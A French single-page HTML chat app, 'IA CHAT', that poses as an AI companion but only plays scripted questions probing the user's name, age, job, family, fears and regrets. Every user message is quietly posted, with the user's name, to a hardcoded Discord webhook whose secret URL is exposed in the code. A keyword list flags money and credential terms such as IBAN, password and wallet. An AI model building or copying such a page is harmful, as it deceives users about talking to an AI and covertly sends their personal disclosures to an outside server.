<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>IA CHAT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: system-ui, 'Segoe UI', sans-serif;
            background: linear-gradient(145deg, #0a1a1a 0%, #071212 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .chat-app {
            width: 100%;
            max-width: 650px;
            height: 90vh;
            background: rgba(18, 24, 28, 0.96);
            border-radius: 40px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
        }
        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px 16px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .message {
            display: flex;
            flex-direction: column;
            max-width: 85%;
            animation: fadeIn 0.2s ease;
        }
        .message.sent { align-self: flex-end; }
        .message.received { align-self: flex-start; }
        .bubble {
            padding: 10px 14px;
            border-radius: 20px;
            font-size: 0.9rem;
            line-height: 1.4;
        }
        .sent .bubble {
            background: linear-gradient(125deg, #2c8a7a, #1fa394);
            color: white;
            border-bottom-right-radius: 4px;
        }
        .received .bubble {
            background: #1e3535;
            color: #f0faf7;
            border-bottom-left-radius: 4px;
            border: 0.5px solid #3e7e7a;
        }
        .meta {
            font-size: 0.55rem;
            margin-top: 3px;
            margin-inline: 6px;
            opacity: 0.6;
        }
        .sent .meta { text-align: right; color: #9ee6dc; }
        .received .meta { color: #89ccc2; }
        .typing {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #173b3bcc;
            padding: 6px 14px;
            border-radius: 28px;
            width: fit-content;
            margin: 5px 0;
            font-size: 0.7rem;
            color: #b8f2ea;
        }
        .dot {
            width: 6px;
            height: 6px;
            background: #91f5e5;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.2s infinite;
        }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .input-container {
            background: #0e1818dd;
            padding: 12px 16px 16px;
            border-top: 1px solid #2a6a5e;
            display: flex;
            gap: 10px;
        }
        .input-wrapper {
            flex: 1;
            background: #1e3d3d;
            border-radius: 48px;
            padding: 3px 6px 3px 18px;
            display: flex;
            border: 1px solid #3e8a7a;
        }
        #messageInput {
            background: transparent;
            border: none;
            padding: 12px 5px;
            font-size: 0.93rem;
            color: #eefaf7;
            width: 100%;
            outline: none;
        }
        #messageInput::placeholder { color: #6fafa3; }
        #sendBtn {
            background: #2c8a7a;
            border: none;
            width: 44px;
            height: 44px;
            border-radius: 44px;
            cursor: pointer;
            color: white;
            font-size: 1.2rem;
            transition: 0.2s;
        }
        #sendBtn:hover { background: #3fbaa5; transform: scale(0.96); }
        #sendBtn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .messages-area::-webkit-scrollbar { width: 4px; }
        .messages-area::-webkit-scrollbar-track { background: #1c3a3a; }
        .messages-area::-webkit-scrollbar-thumb { background: #4bad9e; border-radius: 10px; }
        
        .reset-btn {
            position: fixed;
            bottom: 80px;
            right: 20px;
            background: #2c5a5a;
            border: none;
            padding: 10px 15px;
            border-radius: 30px;
            color: #a0ffd0;
            font-size: 0.7rem;
            cursor: pointer;
            z-index: 100;
            opacity: 0.5;
            transition: 0.2s;
        }
        .reset-btn:hover { opacity: 1; background: #c0392b; color: white; }
        
        .status {
            position: fixed;
            bottom: 10px;
            left: 10px;
            font-size: 0.55rem;
            color: #5fbfb0;
            background: #0a2a2a;
            padding: 3px 8px;
            border-radius: 15px;
        }
    </style>
</head>
<body>
<div class="chat-app">
    <div class="messages-area" id="messagesArea"></div>

    <div id="typingZone" style="padding: 0 16px;"></div>

    <div class="input-container">
        <div class="input-wrapper">
            <input type="text" id="messageInput" placeholder="Message..." autocomplete="off">
        </div>
        <button id="sendBtn">➤</button>
    </div>
</div>
<button class="reset-btn" id="resetBtn">🗑️ Effacer</button>
<div class="status" id="status">🔌 Webhook actif</div>

<script>
    // ========== CONFIGURATION WEBHOOK ==========
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1512382757572182096/Z0qVVwxCrGmOWUgF0K1hCDYDqmdNnyV_noPZRdXCwWmfPK_1jqE5bwjT78O0Q3npxwv6";
    
    let currentUserName = null;
    let sessionId = Math.random().toString(36).substring(2, 10);
    let messageCount = 0;
    
    // Fonction pour envoyer un message au webhook Discord
    async function sendToDiscord(message, isUser) {
        if (!WEBHOOK_URL) return;
        
        let displayName = isUser ? (currentUserName ? `👤 ${currentUserName}` : `🕵️ Utilisateur`) : `🤖 IA Assistant`;
        let avatarUrl = isUser ? "https://cdn-icons-png.flaticon.com/512/1995/1995572.png" : "https://cdn-icons-png.flaticon.com/512/4712/4712039.png";
        let color = isUser ? 0xff5555 : 0x55ff55;
        
        const scamKeywords = ["bitcoin", "crypto", "investir", "gagner argent", "plateforme", "retrait", "dépôt", "parrain", "fiable", "urgent", "code promo", "offre limitée", "carte cadeau", "paypal", "virement", "rib", "iban", "mot de passe", "identifiant", "wallet", "usdt", "ether", "investissement"];
        let isSuspicious = false;
        let lowerMsg = message.toLowerCase();
        for (let kw of scamKeywords) {
            if (lowerMsg.includes(kw)) {
                isSuspicious = true;
                break;
            }
        }
        
        const payload = {
            username: displayName,
            avatar_url: avatarUrl,
            embeds: [{
                title: isUser ? "📨 Nouveau message" : "💬 Réponse IA",
                description: message.length > 1900 ? message.substring(0, 1900) + "..." : message,
                color: isSuspicious && isUser ? 0xff0000 : color,
                timestamp: new Date().toISOString(),
                footer: { text: `Session: ${sessionId} | Msg #${messageCount}` },
                fields: [
                    { name: "👤 Identité", value: currentUserName || "Anonyme", inline: true },
                    { name: "🕐 Heure", value: new Date().toLocaleTimeString('fr-FR'), inline: true }
                ]
            }]
        };
        
        if (isSuspicious && isUser) {
            payload.embeds[0].fields.push({ name: "🚨 ALERTE", value: "Mots-clés suspects détectés", inline: false });
        }
        
        try {
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            document.getElementById('status').innerHTML = "✅ Envoyé";
            setTimeout(() => { document.getElementById('status').innerHTML = "🔌 Webhook actif"; }, 2000);
        } catch(e) { console.error(e); }
    }
    
    function getTime() {
        const now = new Date();
        return now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0') + ':' + now.getSeconds().toString().padStart(2,'0');
    }
    
    // ========== BIBLIOTHÈQUE INFINIE DE QUESTIONS ET RÉPONSES ==========
    const allQuestions = [
        "Raconte-moi ce qui te rend heureux en ce moment.",
        "Quel est ton meilleur souvenir d'enfance ?",
        "Si tu pouvais voyager n'importe où, où irais-tu ?",
        "Qu'est-ce qui te motive à te lever le matin ?",
        "Quel est ton film préféré et pourquoi ?",
        "Tu écoutes quel genre de musique ?",
        "Quelle est ta plus grande passion ?",
        "Parle-moi de tes hobbies.",
        "Quel est ton rêve le plus fou ?",
        "Si tu gagnais au loto, qu'est-ce que tu ferais ?",
        "Quelle est la personne qui t'inspire le plus ?",
        "Quel livre a changé ta vie ?",
        "Tu es plutôt matin ou nuit ?",
        "Quelle est ta saison préférée ?",
        "Tu préfères la mer ou la montagne ?",
        "Quel est ton plat préféré ?",
        "Tu as un animal de compagnie ?",
        "Quelle est ta plus grande force ?",
        "Quelle est ta plus grande faiblesse ?",
        "Parle-moi de ta famille.",
        "Qu'est-ce qui t'inquiète en ce moment ?",
        "Quel est ton plus grand regret ?",
        "Quelle est la meilleure décision que tu aies prise ?",
        "Tu te souviens de ton premier amour ?",
        "Qu'est-ce que tu aimerais apprendre ?",
        "Quelle compétence veux-tu développer ?",
        "Parle-moi de ton meilleur ami.",
        "Qu'est-ce qui te fait rire ?",
        "Quelle est ta série préférée ?",
        "Tu joues à des jeux vidéo ?",
        "Quel sport pratiques-tu ?",
        "Quelle est ta destination de rêve ?",
        "Tu aimes cuisiner ?",
        "Quel est ton talent caché ?",
        "Si tu pouvais changer une chose dans le monde, quoi ?",
        "Qu'est-ce que la réussite pour toi ?",
        "Quel est ton plus grand défi actuel ?",
        "Parle-moi de ton travail.",
        "Qu'est-ce qui te stresse le plus ?",
        "Comment tu te détends après une journée difficile ?",
        "Quelle est la dernière fois que tu as été fier de toi ?",
        "Tu as des projets pour les prochains mois ?",
        "Qu'est-ce qui te manque en ce moment ?",
        "Quelle est ta citation préférée ?",
        "Tu crois au destin ?",
        "Qu'est-ce qui rend la vie belle pour toi ?",
        "Parle-moi de quelque chose que tu as appris récemment.",
        "Quelle est ta plus grande peur ?",
        "Qu'est-ce qui te rend unique ?",
        "Quel conseil donnerais-tu à ton toi du passé ?",
        "Qu'est-ce que tu aimerais faire avant de mourir ?"
    ];
    
    const followUpResponses = [
        "C'est intéressant ! Dis-m'en plus.",
        "Je vois. Et pourquoi ?",
        "Ah bon ? Développe un peu.",
        "Je comprends. Et toi, qu'est-ce que tu en penses vraiment ?",
        "C'est fascinant. Raconte-moi la suite.",
        "Je ne m'attendais pas à ça. Continue.",
        "Merci de partager. Et du coup, comment tu te sens par rapport à ça ?",
        "Je vois. Et si tu devais résumer ça en une phrase ?",
        "C'est noté. Qu'est-ce qui t'a amené à penser ça ?",
        "Intéressant. Est-ce que c'est important pour toi ?",
        "Je comprends. Et ça a changé ta vie ?",
        "C'est beau. Tu as d'autres exemples ?",
        "Je vois. Et tu penses que ça va évoluer ?",
        "Merci pour ton honnêteté. Tu veux ajouter quelque chose ?",
        "Je comprends. Est-ce que tu en as parlé à quelqu'un ?"
    ];
    
    const genericResponses = [
        "Je vois. Continue, je t'écoute.",
        "Intéressant. Dis-m'en plus.",
        "Je comprends. Et après ?",
        "C'est noté. Tu veux parler d'autre chose ?",
        "Merci de partager ça.",
        "Je réfléchis à ce que tu dis...",
        "Hmm, c'est intéressant comme point de vue.",
        "Je ne vois pas les choses exactement pareil, mais je comprends.",
        "C'est un bon sujet. Développe un peu."
    ];
    
    let usedQuestions = [];
    let currentPhase = "initial"; // initial, infinite
    
    // Obtenir une nouvelle question aléatoire (jamais deux fois la même récemment)
    function getRandomQuestion() {
        let available = allQuestions.filter(q => !usedQuestions.includes(q));
        if (available.length === 0) {
            usedQuestions = [];
            available = allQuestions;
        }
        const randomIndex = Math.floor(Math.random() * available.length);
        const question = available[randomIndex];
        usedQuestions.push(question);
        if (usedQuestions.length > 30) usedQuestions.shift();
        return question;
    }
    
    // ========== GESTION DE LA CONVERSATION (INFINIE) ==========
    let currentStep = 0;
    let isWaitingForResponse = true;
    let isProcessing = false;
    let messagesList = [];
    let userAge = null;
    let userJob = null;
    let userMood = null;
    let hasDoneInitial = false;
    let lastQuestionType = "";
    
    // Phase initiale (poser les bases)
    const initialSteps = [
        { field: "name", question: "D'abord, dis-moi ton prénom.", extract: (answer) => { currentUserName = answer.match(/([A-Za-zÀ-ÿ]{2,20})/i)?.[1]?.charAt(0).toUpperCase() + answer.match(/([A-Za-zÀ-ÿ]{2,20})/i)?.[1]?.slice(1).toLowerCase() || null; return !!currentUserName; } },
        { field: "age", question: "Quel âge as-tu ?", extract: (answer) => { userAge = parseInt(answer.match(/(\d+)/)?.[1]); return userAge > 0 && userAge < 120; } },
        { field: "job", question: "Qu'est-ce que tu fais dans la vie ?", extract: (answer) => { userJob = answer.substring(0, 60); return true; } },
        { field: "mood", question: "Comment te sens-tu en ce moment ?", extract: (answer) => { userMood = answer; return true; } }
    ];
    
    let initialIndex = 0;
    
    async function sendIAMessage(text) {
        return new Promise((resolve) => {
            const typingDiv = document.getElementById('typingIndicator');
            if (!typingDiv) {
                const typing = document.createElement('div');
                typing.id = 'typingIndicator';
                typing.className = 'typing';
                typing.innerHTML = '<span>●</span><span class="dot"></span><span class="dot"></span><span class="dot"></span>';
                document.getElementById('typingZone').appendChild(typing);
            }
            setTimeout(() => {
                const el = document.getElementById('typingIndicator');
                if (el) el.remove();
                addMessage(text, false);
                isWaitingForResponse = true;
                resolve();
            }, 500 + Math.random() * 400);
        });
    }
    
    async function processUserAnswer(userMessage) {
        if (isProcessing) return;
        isProcessing = true;
        isWaitingForResponse = false;
        
        // Phase initiale
        if (!hasDoneInitial) {
            if (initialIndex < initialSteps.length) {
                const step = initialSteps[initialIndex];
                const success = step.extract(userMessage);
                if (success || initialIndex > 0) {
                    initialIndex++;
                    if (initialIndex < initialSteps.length) {
                        await sendIAMessage(initialSteps[initialIndex].question);
                    } else {
                        hasDoneInitial = true;
                        currentPhase = "infinite";
                        const firstQuestion = getRandomQuestion();
                        lastQuestionType = "question";
                        await sendIAMessage(firstQuestion);
                    }
                } else {
                    await sendIAMessage(step.question);
                }
                isProcessing = false;
                isWaitingForResponse = true;
                return;
            }
        }
        
        // Phase infinie : répondre avec des relances variées
        if (userMessage.match(/heure|quelle heure|il est quelle/i)) {
            const now = getTime();
            await sendIAMessage(`Il est ${now}. ${getRandomQuestion()}`);
        } else {
            // Choisir aléatoirement le type de réponse
            const responseType = Math.random();
            
            if (responseType < 0.3 && lastQuestionType !== "followup") {
                // Relance
                const followup = followUpResponses[Math.floor(Math.random() * followUpResponses.length)];
                await sendIAMessage(followup);
                lastQuestionType = "followup";
            } else if (responseType < 0.7 || lastQuestionType === "question") {
                // Réponse générique puis nouvelle question
                const generic = genericResponses[Math.floor(Math.random() * genericResponses.length)];
                const newQuestion = getRandomQuestion();
                await sendIAMessage(generic + " " + newQuestion);
                lastQuestionType = "question";
            } else {
                // Nouvelle question directe
                const newQuestion = getRandomQuestion();
                await sendIAMessage(newQuestion);
                lastQuestionType = "question";
            }
        }
        
        isProcessing = false;
        isWaitingForResponse = true;
    }
    
    // ========== STOCKAGE LOCAL ==========
    const STORAGE_KEY = "echo_chat_data";
    
    function saveToStorage() {
        const data = {
            messages: messagesList,
            userName: currentUserName,
            userAge: userAge,
            userJob: userJob,
            userMood: userMood,
            initialIndex: initialIndex,
            hasDoneInitial: hasDoneInitial,
            usedQuestions: usedQuestions,
            currentPhase: currentPhase,
            lastQuestionType: lastQuestionType
        };
        localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    }
    
    function loadFromStorage() {
        const stored = localStorage.getItem(STORAGE_KEY);
        if (stored) {
            try {
                const data = JSON.parse(stored);
                messagesList = data.messages || [];
                currentUserName = data.userName;
                userAge = data.userAge;
                userJob = data.userJob;
                userMood = data.userMood;
                initialIndex = data.initialIndex || 0;
                hasDoneInitial = data.hasDoneInitial || false;
                usedQuestions = data.usedQuestions || [];
                currentPhase = data.currentPhase || "initial";
                lastQuestionType = data.lastQuestionType || "";
                return true;
            } catch(e) {}
        }
        return false;
    }
    
    // ========== AFFICHAGE ==========
    const messagesArea = document.getElementById('messagesArea');
    const messageInput = document.getElementById('messageInput');
    const sendBtn = document.getElementById('sendBtn');
    const typingZone = document.getElementById('typingZone');
    const resetBtn = document.getElementById('resetBtn');
    
    let isSending = false;
    let sendTimeout = null;
    
    function addMessageToUI(text, isUser, time) {
        const div = document.createElement('div');
        div.className = 'message ' + (isUser ? 'sent' : 'received');
        const bubble = document.createElement('div');
        bubble.className = 'bubble';
        bubble.innerText = text;
        const meta = document.createElement('div');
        meta.className = 'meta';
        meta.innerText = (isUser ? 'Moi' : 'IA') + ' · ' + time;
        div.appendChild(bubble);
        div.appendChild(meta);
        messagesArea.appendChild(div);
        messagesArea.scrollTop = messagesArea.scrollHeight;
    }
    
    function addMessage(text, isUser) {
        const time = getTime();
        messageCount++;
        messagesList.push({ text, isUser, time });
        addMessageToUI(text, isUser, time);
        saveToStorage();
        if (isUser) sendToDiscord(text, true);
        if (!isUser && messageCount % 50 === 0) console.log(`📊 ${messageCount} messages échangés`);
    }
    
    function restoreMessages() {
        for (let msg of messagesList) {
            addMessageToUI(msg.text, msg.isUser, msg.time);
        }
    }
    
    async function startConversation() {
        await sendIAMessage("👋 Salut ! Je suis ton compagnon IA. Je vais te poser plein de questions, et on va discuter longtemps !");
        await new Promise(resolve => setTimeout(resolve, 800));
        await sendIAMessage(initialSteps[0].question);
    }
    
    async function sendMessage() {
        const text = messageInput.value.trim();
        if (text === "") return;
        if (isSending || isProcessing) return;
        
        addMessage(text, true);
        messageInput.value = "";
        isSending = true;
        sendBtn.disabled = true;
        
        setTimeout(async () => {
            await processUserAnswer(text);
            isSending = false;
            sendBtn.disabled = false;
            messageInput.focus();
        }, 300);
    }
    
    function resetChat() {
        if (confirm("Effacer toute la conversation ?")) {
            localStorage.removeItem(STORAGE_KEY);
            currentUserName = null;
            userAge = null;
            userJob = null;
            userMood = null;
            initialIndex = 0;
            hasDoneInitial = false;
            usedQuestions = [];
            currentPhase = "initial";
            lastQuestionType = "";
            messagesList = [];
            messageCount = 0;
            messagesArea.innerHTML = "";
            saveToStorage();
            setTimeout(() => startConversation(), 300);
        }
    }
    
    sendBtn.onclick = sendMessage;
    messageInput.onkeypress = (e) => { if (e.key === 'Enter' && !isSending && !isProcessing) { e.preventDefault(); sendMessage(); } };
    resetBtn.onclick = resetChat;
    
    const hasSaved = loadFromStorage();
    if (hasSaved && messagesList.length > 0) {
        restoreMessages();
        isWaitingForResponse = true;
    } else {
        startConversation();
    }
    messageInput.focus();
</script>
</body>
</html>
